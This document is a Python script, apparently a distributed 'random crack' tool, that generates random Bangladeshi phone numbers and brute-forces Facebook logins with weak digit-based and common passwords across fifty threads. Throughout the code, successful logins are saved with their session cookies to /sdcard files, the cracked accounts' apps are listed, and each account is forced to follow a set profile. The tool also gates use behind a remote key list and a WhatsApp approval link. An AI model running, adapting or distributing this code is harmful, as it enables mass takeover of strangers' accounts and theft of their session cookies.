import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#-----[Global Functions]-----#
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
#-----[Colours]-----#
RED = '\033[1;91m' #
WHITE = '\033[1;97m' #
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m' #
BLUE = '\033[1;34m' #
ORANGE = '\033[1;35m' #
P = '\x1b[1;97m' # 
M = '\x1b[1;91m' # 
H = '\x1b[1;92m' # 
K = '\x1b[1;92m' # 
B = '\x1b[1;94m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;96m' #
N = '\x1b[0m' #
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
mtd,cp_cpx,cokix=[],[],[]
#-----[App Checker]-----#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  '%(N,M,N,M,N))
    else:
        print(f'\r[💚] %s \x1b[1;95m YOUR ACTIVE APPS   :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r%s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[💔] %s \x1b[1;95m YOUR EXPIRED APPS    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/coderet.d.looper', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
           
#-----[UserAgent]-----
ugen=[]
def uaku():
    try:
        ua=open('useragent.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://raw.githubusercontent.com/Dragon-Lord-404/urban-tribble/main/useragent.txt').text
        ua=open('useragent.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('useragent.txt','r').read().splitlines()
#-----[Logo]-----#
logo = ("""
\033[1;91m       ____  ____  ___   __________  _   __
\033[1;92m      / __ \/ __ \/   | / ____/ __ \/ | / /
\033[1;93m     / / / / /_/ / /| |/ / __/ / / /  |/ /    
\033[1;94m    / /_/ / _, _/ ___ / /_/ / /_/ / /|  /      
\033[1;95m   /_____/_/ |_/_/  |_\____/\____/_/ |_/        \033[1;92m
 ┌─────────────────────────────────────────┐
 │ [✓] AUTHOR   : FIRDAWS SAPNO            │
 │ [✓] TOOL     : RANDOM CRACK             │
 │ [✓] STATUS   : FREE                     │
 │ [✓] GITHUB   : Dragon-Lord-404          │
 │ [✓] FACEBOOK : FIRDAWS SAPNO            │
 │ [✓] VERSION  : 0.3 [LOCK REMOVE]        │
 │ [✓] FEATURE  : APK CHECKER              │
 └─────────────────────────────────────────┘""")
try:
   print('\n\n\033[1;33mLOADING ASSET FILES ... \033[0;97m')
   v = 5.2
   update = ('5.2')
   update = ('5.2')
   if str(v) in update:
       os.system('clear')
   else:pass
except:print('\n\033[1;31mNO INTERNET CONNECTION ... \033[0;97m')

def linex():
        print('\033[1;37m ──────────────────────────────────────────')
 
def clear():
    os.system('clear')
    print(logo)
    
#-----[Loop Menu]-----#  
loop = 0
oks = []
cps = []

#-----[Main-Menu]-----#
def lord_menu():
    os.system('clear');print(logo)
    print('\033[1;92m [1] RANDOM CRACK')
    print('\033[1;92m [0] EXIT TOOL')
    linex()
    lord=input(' \033[1;32m[?] SELECT MENU: ')
    if lord in['1','01']:superuser()
    elif lord in['0','00']:exit()
    else:exit()
    
def innocent():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print('\033[1;32m [√] BD CODE : 017/019/016/018/013/015')
    linex()
    code = input('\033[1;32m [?] CHOOSE : ')
    os.system('clear')
    print(logo)
    print('\033[1;32m [√] EXAMPLE : 3000/5000/10000/50000')
    linex()
    limit = int(input('\033[1;32m [?] CHOOSE : '))
    linex()
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=50) as ahare:
        clear()
        tl = str(len(user))
        print('\033[1;32m [+] Choice Code: '+code)
        print('\033[1;92m [+] Crack Process Has Started')
        print('\033[1;92m [!] Some id will be lock')
        print('\033[1;92m [!] Use Flight Mode For Speed Up')
        linex()
        for fuck in user:
            pwx = ["last6digit", "last7digit", "last8digit", "last9digit", "last10digit", "fullnumber", "first6digit", "first7digit", "first8digit", "first9digit", "first10digit", "Bangladesh", "i love you", "102030", "203040", "304050", "405060", "506070", "607080", "708090"]
            uid = code+fuck
            ahare.submit(lordx,uid,pwx,tl)
    print('CRACK PROCESS HAS BEEN COMPLETED ')
    print('Ok Ids Saved in /DRAGON-OK.txt')
    print('Cp Ids Saved in /DRAGON-CP.txt')
    linex()
    
def lordx(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        last7digit = uid[int(len(uid))-7:]
        last6digit = uid[int(len(uid))-6:]
        last8digit = uid[int(len(uid))-8:]
        last9digit = uid[int(len(uid))-9:]
        last10digit = uid[int(len(uid))-10:]
        first6digit = uid[0:6]
        first7digit = uid[0:7]
        first8digit = uid[0:8]
        first9digit = uid[0:9]
        first10digit = uid[0:10]
        fullnumber = uid
        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mSCANNING\033[0;97m]••[\033[0;94m%s/%s\033[0;97m]••[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]••[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m]'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
        for ps in pwx:
            ps = ps.replace("last7digit",last7digit)
            ps = ps.replace("last6digit",last6digit)
            ps = ps.replace("last8digit",last8digit)
            ps = ps.replace("last9digit",last9digit)
            ps = ps.replace("last10digit",last10digit)
            ps = ps.replace("first6digit",first6digit)
            ps = ps.replace("first6digit",first6digit)
            ps = ps.replace("first7digit",first7digit)
            ps = ps.replace("first8digit",first8digit)
            ps = ps.replace("first9digit",first9digit)
            ps = ps.replace("first10digit",first10digit)
            ps = ps.replace("fullnumber",fullnumber)
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'p.facebook.com',
            'method':'GET',
            'scheme':'https',
            'access-control-allow-origin': '*',
            'facebook-api-version': 'v17.0',
            'strict-transport-security': 'max-age=15552000; preload',
            'pragma': 'no-cache',
            'cache-control': 'private, no-cache, no-store, must-revalidate',
            'x-fb-request-id': 'AFIDbHyt64aMLKXqlTrceYY',
            'x-fb-trace-id': 'F9k/IXe6GPv',
            'x-fb-rev': '1008157668',
            'x-fb-debug': 'c931stKO1P8xAG5PRAjeJa7+zd11brUUxs/AXdx7muT1243P0/4pf4Y2KBU+opCEAh5nMFzYLRRuuG6Tte3mcQ==',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,bn;q=0.8,pt;q=0.7',
            'cache-control': 'max-age=0',
            'dpr': '1',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro,
            'viewport-width': '980',}
            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[DRAGON-OK] ' +uid+ ' • ' +ps+ ' \n\033[1;33m[🍪]\033[1;33mCookie = \033[1;32m'+coki+ '')
                cek_apk(session,coki)
                follow(session,coki)
                linex()
                open('/sdcard/DRAGON-OK.txt', 'a').write( uid+' | '+ps+'\n'+coki+'')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                if 'y' in cp_cpx: 
                 #print('\r\r\033[1;30m[DRAGON-CP]  ' +uid+ ' • ' +ps+ ' \033[0;97m')
                 open('/sdcard/DRAGON-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except:
        pass
#-----[Run Menu]-----#
def superuser():
    UMO="DRAGON-"
    uuid = str(os.geteuid()) + str(os.getlogin()) 
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/Dragon-Lord-404/DRAGON-FILE/blob/main/login.txt").text
    if id in DARK:
        innocent()
    else:
        os.system("clear")
        time.sleep(3.0)
        
        os.system("clear")
        print(logo)
        print("\t\033[30m   [\033[1;32m\033[47m First Get Approvel\033[00m\033[1;30m]")
        print ("")
        print("┌━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┐ \n\033[1;32m│ Note : That is FREE but you need approval to use it      │\033[1;37m\n└━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┘")
        print ("")
        print("               Your Key is Not Approved ")
        print("               Copy And Send Key To Admin")
        print ("")
        print (" Your Key : "+UMO+id)
        print ("\n")
        name = input(" Your Name : ")
        print ("")
        input(" Press Enter To Send Key")
        os.system("xdg-open https:/wa.me/+8801576593082")
        superuser()        
superuser()